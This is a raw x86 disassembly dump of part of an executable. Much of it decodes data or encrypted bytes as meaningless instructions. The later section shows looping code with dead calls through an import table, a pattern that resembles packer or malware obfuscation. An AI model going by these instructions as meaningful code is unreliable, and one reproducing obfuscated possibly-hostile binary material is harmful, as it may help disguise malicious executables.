  40bab4:	(bad)  
  40bab5:	jne    0x40ba6d
  40bab7:	leave  
  40bab8:	mov    ds:0x55f6505c,eax
  40babd:	ja     0x40ba64
  40babf:	shl    BYTE PTR [esi],cl
  40bac1:	add    ah,bl
  40bac3:	pop    ss
  40bac4:	dec    esp
  40bac5:	or     eax,DWORD PTR [esp+edx*4+0xa]
  40bac9:	je     0x40bada
  40bacb:	lds    esp,FWORD PTR [ecx+ecx*2-0x40]
  40bacf:	push   ecx
  40bad0:	outs   dx,DWORD PTR ds:[esi]
  40bad1:	stos   BYTE PTR es:[edi],al
  40bad2:	jno    0x40baf0
  40bad4:	nop
  40bad5:	inc    ecx
  40bad6:	test   dl,bl
  40bad8:	retf   0x1382
  40badb:	ror    al,0x90
  40bade:	ja     0x40bb36
  40bae0:	xor    DWORD PTR [edi+0x52548dbb],esi
  40bae6:	fisub  DWORD PTR [ebp+0x2]
  40bae9:	int3   
  40baea:	add    esp,DWORD PTR [ebp+0x71]
  40baed:	(bad)  
  40baee:	fnstcw WORD PTR [eax-0x4e6d68c7]
  40baf4:	(bad)  
  40baf5:	jnp    0x40baa6
  40baf7:	cld    
  40baf8:	mov    cl,BYTE PTR [ecx+edi*4+0x67]
  40bafc:	sub    al,0x88
  40bafe:	push   edx
  40baff:	push   0xffffffcb
  40bb01:	or     DWORD PTR [ecx],ebx
  40bb03:	jb     0x40bb5d
  40bb05:	mov    bh,0x57
  40bb07:	test   eax,0x1e11abeb
  40bb0c:	cmp    ebp,DWORD PTR [ebx-0x2182dae]
  40bb12:	call   0x4290:0xa8e8e5ab
  40bb19:	sub    esp,DWORD PTR [edi+0x389c9abb]
  40bb1f:	jmp    0x2ca3f207
  40bb24:	sbb    eax,0xbeb7389d
  40bb29:	ins    BYTE PTR es:[edi],dx
  40bb2a:	cmc    
  40bb2b:	sub    al,0xc8
  40bb2d:	daa    
  40bb2e:	out    dx,al
  40bb2f:	add    al,BYTE PTR [esi-0x23]
  40bb32:	sbb    BYTE PTR [edx],0x9c
  40bb35:	sar    DWORD PTR [edi-0x32],cl
  40bb38:	fs add eax,0xc781f046
  40bb3e:	and    eax,0xe568a74a
  40bb43:	jo     0x40bad0
  40bb45:	bound  esi,QWORD PTR [edx-0x12]
  40bb48:	pop    es
  40bb49:	out    dx,eax
  40bb4a:	shr    BYTE PTR [edx-0x5718fc4a],1
  40bb50:	loopne 0x40bb0a
  40bb52:	in     al,dx
  40bb53:	xchg   edx,eax
  40bb54:	xchg   ecx,eax
  40bb55:	aad    0xfa
  40bb57:	jb     0x40bb3e
  40bb59:	(bad)  
  40bb5a:	jno    0x40bbaa
  40bb5c:	fldenv [esi+edx*1+0x2f]
  40bb60:	popf   
  40bb61:	xchg   ebx,eax
  40bb62:	retf   0x9962
  40bb65:	and    DWORD PTR ds:0x9eb80649,ebp
  40bb6b:	pop    ecx
  40bb6c:	shl    ch,0x6d
  40bb6f:	js     0x40bba8
  40bb71:	ja     0x40bbc7
  40bb73:	adc    bl,BYTE PTR [ebp-0x252ae311]
  40bb79:	or     eax,0x6c0e275e
  40bb7e:	or     eax,0xec7ff2e8
  40bb83:	out    dx,eax
  40bb84:	scas   eax,DWORD PTR es:[edi]
  40bb85:	or     DWORD PTR [eax+0x5d],esp
  40bb88:	jl     0x40bba4
  40bb8a:	mov    edi,DWORD PTR [ecx-0x43354fc8]
  40bb90:	sub    dl,BYTE PTR [edi]
  40bb92:	stc    
  40bb93:	bnd jne 0x40bb8f
  40bb96:	adc    al,0xb8
  40bb98:	cmp    eax,0x434cdc80
  40bb9d:	mov    esp,0x7a8e99dc
  40bba2:	xchg   BYTE PTR [edi],dh
  40bba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba5:	adc    eax,0x6d932350
  40bbaa:	cli    
  40bbab:	jge    0x40bb9c
  40bbad:	test   al,0x5e
  40bbaf:	(bad)  
  40bbb0:	jl     0x40bbdc
  40bbb2:	cmp    eax,0xe331e338
  40bbb7:	sub    DWORD PTR [edx+0x85b1dd],ebx
  40bbbd:	(bad)  
  40bbbe:	in     eax,0x22
  40bbc0:	jae    0x40bb50
  40bbc2:	xchg   ax,ax
  40bbc4:	add    DWORD PTR [edi+0x1b],0xffffffb7
  40bbc8:	ja     0x40bbb4
  40bbca:	mov    ds:0xa3906b58,eax
  40bbcf:	aad    0xf6
  40bbd1:	clc    
  40bbd2:	js     0x40bc24
  40bbd4:	xlat   BYTE PTR ds:[ebx]
  40bbd5:	or     eax,0xdedb83e3
  40bbda:	ret    0xd040
  40bbdd:	xor    eax,0xcfe970e0
  40bbe2:	mov    edx,0x96436a02
  40bbe7:	jge    0x40bc03
  40bbe9:	test   al,0xf8
  40bbeb:	es out dx,al
  40bbed:	fimul  DWORD PTR [edi-0x42bbcb5d]
  40bbf3:	mov    edi,edi
  40bbf5:	ret    0xea91
  40bbf8:	xchg   esp,eax
  40bbf9:	mov    al,ds:0x56e75b0d
  40bbfe:	fist   WORD PTR [ebp+0x52]
  40bc01:	fwait
  40bc02:	out    0x44,al
  40bc04:	jns    0x40bc56
  40bc06:	sub    bh,ch
  40bc08:	sbb    cl,ch
  40bc0a:	adc    eax,ebp
  40bc0c:	jno    0x40bc89
  40bc0e:	test   al,0x73
  40bc10:	(bad)  
  40bc12:	int    0xd1
  40bc14:	idiv   DWORD PTR [esi-0x7a]
  40bc17:	add    eax,0xcb50bc6f
  40bc1c:	repz jge 0x40bc2f
  40bc1f:	mov    cl,0xb7
  40bc21:	mov    bh,0x55
  40bc23:	out    0x36,al
  40bc25:	and    dh,ch
  40bc27:	xor    ah,BYTE PTR [esi+0x6e]
  40bc2a:	cmp    dh,BYTE PTR [ebp+ebx*8-0x5b]
  40bc2e:	sbb    al,0x46
  40bc30:	or     al,0xd4
  40bc32:	dec    esi
  40bc33:	stc    
  40bc34:	iret   
  40bc35:	rol    DWORD PTR [edi+0xb2e47a2],0xdf
  40bc3c:	sbb    BYTE PTR [ecx-0x71bbe7e7],bl
  40bc42:	fmul   DWORD PTR [edx]
  40bc44:	call   0xffa7:0xf49e32d7
  40bc4b:	cmp    al,0xf9
  40bc4d:	or     BYTE PTR [edx+0xc],dh
  40bc50:	jb     0x40bc39
  40bc52:	stc    
  40bc53:	clc    
  40bc54:	idiv   BYTE PTR [edx-0x45]
  40bc57:	cld    
  40bc58:	into   
  40bc59:	fisub  DWORD PTR [esi]
  40bc5b:	sub    esp,DWORD PTR [esi-0x38]
  40bc5e:	jmp    0x40bc0d
  40bc60:	push   ss
  40bc61:	jo     0x40bc18
  40bc63:	stos   DWORD PTR es:[edi],eax
  40bc64:	addr16 dec eax
  40bc66:	xlat   BYTE PTR ds:[ebx]
  40bc67:	fadd   DWORD PTR [ebx]
  40bc69:	sub    eax,0x6f9f88fe
  40bc6e:	cmp    esi,edi
  40bc70:	jecxz  0x40bce4
  40bc72:	in     al,dx
  40bc73:	rcr    DWORD PTR [eax+0x25],1
  40bc76:	in     eax,dx
  40bc77:	sbb    BYTE PTR [ebx],al
  40bc79:	out    0xae,eax
  40bc7b:	sbb    DWORD PTR [esi-0x78a89d7],ebx
  40bc81:	mov    esi,0xec5e7dd9
  40bc86:	jno    0x40bc27
  40bc88:	div    ecx
  40bc8a:	repz sbb BYTE PTR [edi],dh
  40bc8d:	(bad)  [ecx]
  40bc8f:	out    0xee,eax
  40bc91:	cmp    DWORD PTR [ecx],ecx
  40bc93:	sub    al,BYTE PTR [ecx+0x73ac5e1f]
  40bc99:	test   esp,esp
  40bc9b:	xchg   ecx,eax
  40bc9c:	or     BYTE PTR [esp+esi*4+0x1b417b8c],bl
  40bca3:	(bad)  
  40bca4:	mov    eax,0x4d23c968
  40bca9:	mov    eax,0x5d590d2f
  40bcae:	fwait
  40bcaf:	dec    ecx
  40bcb0:	scas   al,BYTE PTR es:[edi]
  40bcb1:	pop    edx
  40bcb2:	mov    eax,0xab3f1bb7
  40bcb7:	fcmovu st,st(5)
  40bcb9:	loop   0x40bcdd
  40bcbb:	sbb    BYTE PTR [edx+0x30],ch
  40bcbe:	mov    bh,0x3d
  40bcc0:	and    ah,BYTE PTR [edx-0x65]
  40bcc3:	mov    ds,edx
  40bcc5:	adc    ecx,esi
  40bcc7:	(bad)  
  40bcc8:	mov    dh,0x4
  40bcca:	or     edi,esi
  40bccc:	sti    
  40bccd:	enter  0x82bd,0xde
  40bcd1:	test   al,0x34
  40bcd3:	adc    dl,BYTE PTR [ebp+0x1c]
  40bcd6:	dec    edx
  40bcd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcd8:	nop
  40bcd9:	sub    BYTE PTR [eax+0x3bcdf23c],dl
  40bcdf:	ret    0x61af
  40bce2:	popf   
  40bce3:	into   
  40bce4:	aad    0x8c
  40bce6:	call   0xadaa:0xa91100b5
  40bced:	xchg   bl,cl
  40bcef:	jge    0x40bcab
  40bcf1:	pop    esp
  40bcf2:	retf   0x8708
  40bcf5:	hlt    
  40bcf6:	add    DWORD PTR [edx+0x6e],edx
  40bcf9:	xchg   edx,eax
  40bcfa:	pop    ds
  40bcfb:	ds stos BYTE PTR es:[edi],al
  40bcfd:	lahf   
  40bcfe:	jle    0x40bcfd
  40bd00:	cmp    BYTE PTR [edx],al
  40bd02:	pusha  
  40bd03:	(bad)  
  40bd04:	mov    ebx,0x3866714b
  40bd09:	push   ebx
  40bd0a:	icebp  
  40bd0b:	push   esi
  40bd0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd0d:	add    al,0xd5
  40bd0f:	mov    ds,esi
  40bd11:	ds add al,0x11
  40bd14:	scas   al,BYTE PTR es:[edi]
  40bd15:	inc    eax
  40bd16:	out    0x66,al
  40bd18:	retf   0x4bb2
  40bd1b:	aam    0x68
  40bd1d:	imul   esi,DWORD PTR [eax-0xe],0xd54d945b
  40bd24:	in     eax,dx
  40bd25:	mov    dl,0x57
  40bd27:	ds pop ebx
  40bd29:	ins    BYTE PTR es:[edi],dx
  40bd2a:	cmp    DWORD PTR [ebx+0x63dca361],ebx
  40bd30:	sub    esi,esi
  40bd32:	sub    DWORD PTR [ecx],0xc950395d
  40bd38:	or     ecx,ebx
  40bd3a:	cdq    
  40bd3b:	mov    bl,bl
  40bd3d:	mov    edx,0x5f88c214
  40bd42:	fadd   st,st(3)
  40bd44:	aam    0x73
  40bd46:	js     0x40bcd1
  40bd48:	mov    ds:0xd0c66be8,al
  40bd4d:	and    al,0x66
  40bd4f:	mov    ecx,DWORD PTR [ecx]
  40bd51:	mov    DWORD PTR [eax],ecx
  40bd53:	jmp    0x40c074
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	std    
  40bd65:	inc    ecx
  40bd66:	add    bh,BYTE PTR [esp+ebx*1-0x7e]
  40bd6a:	jle    0x40bdea
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	and    al,0xd2
  40bd72:	aas    
  40bd73:	mov    dl,0xac
  40bd75:	mov    DWORD PTR [ebp-0x2b],edx
  40bd78:	mov    esp,0xdf53734c
  40bd7d:	stos   DWORD PTR es:[edi],eax
  40bd7e:	hlt    
  40bd7f:	lods   eax,DWORD PTR ds:[esi]
  40bd80:	jne    0x40bd22
  40bd82:	les    ebp,FWORD PTR [esp+eiz*2]
  40bd85:	mov    ebp,0x1836c07d
  40bd8a:	push   edx
  40bd8b:	frstor [ebp+edx*8+0x2b6458cf]
  40bd92:	fdiv   st(6),st
  40bd94:	add    eax,0x69994b49
  40bd99:	sbb    al,0x70
  40bd9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd9c:	test   ah,0x3a
  40bd9f:	add    BYTE PTR [edi-0x25911e62],dl
  40bda5:	jmp    0x4fdf:0xeb6145d
  40bdac:	xchg   ebp,eax
  40bdad:	mov    al,0x42
  40bdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdb0:	dec    esp
  40bdb1:	and    edx,DWORD PTR [edx-0x3c]
  40bdb4:	das    
  40bdb5:	jb     0x40bdec
  40bdb7:	jae    0x40bd54
  40bdb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdba:	jno    0x40be37
  40bdbc:	int    0x3e
  40bdbe:	pushf  
  40bdbf:	call   0x9d40:0x710cd02
  40bdc6:	into   
  40bdc7:	sub    BYTE PTR [edi],bl
  40bdc9:	rcr    esi,1
  40bdcb:	retf   0x757d
  40bdce:	test   al,0x87
  40bdd0:	cs xchg ecx,eax
  40bdd3:	daa    
  40bdd4:	inc    ecx
  40bdd5:	ss add eax,0x618595ba
  40bddb:	aaa    
  40bddc:	xchg   esi,eax
  40bddd:	mov    ch,dh
  40bddf:	ret    0x7b3c
  40bde2:	inc    ecx
  40bde3:	sbb    ch,BYTE PTR [esi+0xb]
  40bde6:	pop    es
  40bde7:	vpackssdw xmm0,xmm4,xmm0
  40bdeb:	mov    cl,0x8c
  40bded:	sub    dh,BYTE PTR [esi+0x6f61123c]
  40bdf3:	fadd   DWORD PTR [ecx]
  40bdf5:	jmp    0x40bd7a
  40bdf7:	dec    edi
  40bdf8:	les    ebp,FWORD PTR [ecx]
  40bdfa:	(bad)  
  40bdfb:	sub    eax,0x229eaeaa
  40be00:	and    DWORD PTR [ebp-0x5ab00cd4],edi
  40be06:	and    ebp,DWORD PTR [esi]
  40be08:	inc    ecx
  40be09:	xor    esi,esi
  40be0b:	je     0x40bdd9
  40be0d:	mov    dh,0x33
  40be0f:	out    dx,eax
  40be10:	push   ebp
  40be11:	xchg   ebx,eax
  40be12:	jp     0x40bda6
  40be14:	dec    edx
  40be15:	push   0x64
  40be17:	and    eax,0x50517877
  40be1c:	sbb    DWORD PTR [edx],edi
  40be1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be1f:	in     al,dx
  40be20:	into   
  40be21:	lock pop ebp
  40be23:	pop    edi
  40be24:	push   eax
  40be25:	mov    al,0xed
  40be27:	jae    0x40be1b
  40be29:	shl    DWORD PTR [ebx-0x16],cl
  40be2c:	je     0x40bddf
  40be2e:	xor    BYTE PTR [ebx+0xe],bh
  40be31:	jg     0x40be81
  40be33:	or     al,0xa
  40be35:	pop    ecx
  40be36:	adc    al,0x1c
  40be38:	mov    esp,0x67fdebc6
  40be3d:	push   ebp
  40be3e:	sbb    DWORD PTR [esi+eiz*4+0x1f],esp
  40be42:	sub    al,0x8
  40be44:	daa    
  40be45:	(bad)  
  40be46:	push   cs
  40be47:	push   esi
  40be48:	mov    al,0xa1
  40be4a:	fisub  DWORD PTR [edi-0x496f45e5]
  40be50:	cs jbe 0x40bdfc
  40be53:	inc    ecx
  40be54:	push   ecx
  40be55:	mov    al,ds:0xc9cdf2dd
  40be5a:	test   BYTE PTR [esi+eiz*2-0x3d4e115],al
  40be61:	xchg   edi,eax
  40be62:	dec    ebx
  40be63:	ins    BYTE PTR es:[edi],dx
  40be64:	sub    DWORD PTR [ebx],0x2034c249
  40be6a:	inc    DWORD PTR [edi+0x6275a563]
  40be70:	dec    ecx
  40be71:	imul   ecx,DWORD PTR [esi],0xa164b6f7
  40be77:	sbb    DWORD PTR [eax+eax*8-0x200cfc14],0xf
  40be7f:	lock xchg ecx,eax
  40be81:	xor    DWORD PTR [esi+0x6ae238e7],0xffffffe9
  40be88:	call   0x97cc:0x20732c9d
  40be8f:	inc    esp
  40be90:	mov    dl,0x7
  40be92:	mov    eax,ds:0x5b205fc
  40be97:	enter  0x2d75,0x36
  40be9b:	inc    ebx
  40be9c:	out    0x3a,al
  40be9e:	lock xchg edi,eax
  40bea0:	aad    0x2c
  40bea2:	out    dx,al
  40bea3:	inc    eax
  40bea4:	iret   
  40bea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea6:	int    0x72
  40bea8:	or     eax,0x5ae3a927
  40bead:	jne    0x40be7e
  40beaf:	es (bad) 
  40beb1:	jg     0x40bea5
  40beb3:	stos   DWORD PTR es:[edi],eax
  40beb4:	and    eax,0xe7908fb8
  40beb9:	sub    al,BYTE PTR ds:0xd80dfe31
  40bebf:	jl     0x40bf40
  40bec1:	call   DWORD PTR [ebx-0x2]
  40bec4:	int3   
  40bec5:	dec    edi
  40bec6:	add    DWORD PTR [ebx-0x7],ecx
  40bec9:	push   0x73
  40becb:	test   BYTE PTR [ebp+0x4123f40f],0xc1
  40bed2:	repz cli 
  40bed4:	cmp    al,0x61
  40bed6:	pusha  
  40bed7:	add    al,0x76
  40bed9:	lods   al,BYTE PTR ds:[esi]
  40beda:	stc    
  40bedb:	aas    
  40bedc:	xchg   esi,eax
  40bedd:	sub    cl,cl
  40bedf:	out    0x50,al
  40bee1:	nop
  40bee2:	repz push ds
  40bee4:	xor    DWORD PTR [edx-0x72],ecx
  40bee7:	cli    
  40bee8:	inc    eax
  40bee9:	nop
  40beea:	xor    eax,0x1e2bb252
  40beef:	stos   BYTE PTR es:[edi],al
  40bef0:	add    DWORD PTR [ebp-0x3978d1bb],0xe486ce16
  40befa:	cdq    
  40befb:	rcl    BYTE PTR ds:0x35173ab5,cl
  40bf01:	push   eax
  40bf02:	mov    al,0x10
  40bf04:	or     esp,DWORD PTR [esi-0x64]
  40bf07:	dec    edi
  40bf08:	bound  eax,QWORD PTR [ebp+0x3b]
  40bf0b:	pop    ebp
  40bf0c:	clc    
  40bf0d:	mov    edi,0x605dc3a8
  40bf12:	shl    DWORD PTR [ebx],1
  40bf14:	lds    ecx,FWORD PTR [ebp-0x468c408c]
  40bf1a:	in     eax,0x77
  40bf1c:	cmc    
  40bf1d:	scas   eax,DWORD PTR es:[edi]
  40bf1e:	test   DWORD PTR [ecx],ecx
  40bf20:	jmp    0x40bf76
  40bf22:	std    
  40bf23:	sbb    edi,DWORD PTR [eax-0x68d739ca]
  40bf29:	ds inc ebx
  40bf2b:	sbb    eax,0x551f6fb7
  40bf30:	repz scas al,BYTE PTR es:[edi]
  40bf32:	repnz cmc 
  40bf34:	int3   
  40bf35:	add    ecx,DWORD PTR [eax+0x2f7cde54]
  40bf3b:	aam    0xa2
  40bf3d:	or     eax,0x7dc3adc3
  40bf42:	inc    edx
  40bf43:	jb     0x40bee3
  40bf45:	out    0x73,eax
  40bf47:	inc    ebp
  40bf48:	pop    edi
  40bf49:	pop    edx
  40bf4a:	mov    bh,0xec
  40bf4c:	push   es
  40bf4d:	shl    DWORD PTR [ebx+0x53],0x26
  40bf51:	cld    
  40bf52:	fimul  DWORD PTR [ebx+0xf]
  40bf55:	xchg   BYTE PTR [ebx+eax*2+0x66],bl
  40bf59:	push   cs
  40bf5a:	dec    edi
  40bf5b:	out    0x54,al
  40bf5d:	mov    esp,?
  40bf5f:	adc    ch,BYTE PTR [edi-0x56]
  40bf62:	mov    ebp,0xa02738b1
  40bf67:	repz es cdq 
  40bf6a:	dec    esp
  40bf6b:	dec    edx
  40bf6c:	adc    al,0x26
  40bf6e:	sub    al,0x17
  40bf70:	inc    esp
  40bf71:	(bad)  
  40bf72:	mov    dl,0x4a
  40bf74:	or     bl,cl
  40bf76:	xchg   ah,dl
  40bf78:	pop    esi
  40bf79:	(bad)
  40bf7c:	and    BYTE PTR [edx],dh
  40bf7e:	sub    al,0x17
  40bf80:	adc    eax,0xcb9b8a51
  40bf85:	pop    esp
  40bf86:	jne    0x40bff8
  40bf88:	cli    
  40bf89:	call   0xa1ced1cc
  40bf8e:	lea    ebx,[esi+0x39698c2f]
  40bf94:	inc    ebp
  40bf95:	xchg   edx,eax
  40bf96:	xchg   ebx,eax
  40bf97:	test   BYTE PTR [ebp+0x3],dh
  40bf9a:	jmp    0x713a2e8b
  40bf9f:	and    DWORD PTR [ecx+0x7d97d4be],ebp
  40bfa5:	ds push ds
  40bfa7:	fisubr DWORD PTR ds:0xd64bde65
  40bfad:	test   al,0x1d
  40bfaf:	(bad)  
  40bfb0:	into   
  40bfb1:	inc    ecx
  40bfb2:	retf   0xcfb5
  40bfb5:	pushf  
  40bfb6:	cs jne 0x40bf8b
  40bfb9:	pop    eax
  40bfba:	lods   al,BYTE PTR ds:[esi]
  40bfbb:	mov    eax,0xc9f5a3a5
  40bfc0:	cmp    al,0x4
  40bfc2:	cmp    ah,BYTE PTR [edx]
  40bfc4:	push   esp
  40bfc5:	out    dx,al
  40bfc6:	rol    esp,cl
  40bfc8:	mov    dl,0x4f
  40bfca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfcb:	xchg   DWORD PTR [eax-0x70],ebp
  40bfce:	mov    dh,0xf8
  40bfd0:	xor    ch,bl
  40bfd2:	pop    edi
  40bfd3:	leave  
  40bfd4:	and    DWORD PTR [edi+0x71],ecx
  40bfd7:	sbb    ebx,DWORD PTR ds:0xda8b2d86
  40bfdd:	adc    DWORD PTR ds:0x99f48fae,0x27
  40bfe4:	push   0xffffff88
  40bfe6:	inc    eax
  40bfe7:	and    BYTE PTR [eax],0x87
  40bfea:	jae    0x40bf81
  40bfec:	jmp    FWORD PTR [ebx]
  40bfee:	and    esi,DWORD PTR [edx-0x54]
  40bff1:	lods   al,BYTE PTR ds:[esi]
  40bff2:	fnstcw WORD PTR [edx+0x48]
  40bff5:	mov    esp,0x273764c9
  40bffa:	push   cs
  40bffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bffc:	add    DWORD PTR [ebp-0x56fec1d],0x1b
  40c003:	fst    DWORD PTR [ebx+0x1f33bf89]
  40c009:	es add al,0xaf
  40c00c:	or     BYTE PTR [ecx],dh
  40c00e:	arpl   WORD PTR [edx],sp
  40c010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c011:	cmp    BYTE PTR [edi-0x7c],ch
  40c014:	dec    edi
  40c015:	mov    bl,0xf2
  40c017:	test   DWORD PTR [edi+ecx*4],ebx
  40c01a:	fld    st(2)
  40c01c:	(bad)  
  40c01e:	stc    
  40c01f:	leave  
  40c020:	jl     0x40bfff
  40c022:	mov    esp,0xb21e6421
  40c027:	push   ds
  40c028:	sbb    BYTE PTR [esi+0x5a205643],dl
  40c02e:	push   0xef167ab6
  40c033:	adc    al,0x82
  40c035:	ret    0xa6ea
  40c038:	(bad)  
  40c039:	es push cs
  40c03b:	outs   dx,DWORD PTR ds:[esi]
  40c03c:	jle    0x40c08f
  40c03e:	mov    bh,0x9e
  40c040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c041:	xor    eax,0x8b341707
  40c046:	leave  
  40c047:	aaa    
  40c048:	jo     0x40c030
  40c04a:	outs   dx,DWORD PTR ds:[esi]
  40c04b:	inc    ecx
  40c04c:	push   0x8cf7df41
  40c051:	jmp    0xe2e69577
  40c056:	jo     0x40c06a
  40c058:	mov    dh,0x32
  40c05a:	push   edi
  40c05b:	test   DWORD PTR [ecx+0x51],ebp
  40c05e:	(bad)
  40c061:	arpl   WORD PTR ds:0xd0b160ce,sp
  40c067:	rol    ebx,1
  40c069:	mov    esi,0x304237c0
  40c06e:	int    0x80
  40c070:	inc    esi
  40c071:	and    DWORD PTR [ebp+0x64],ebx
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
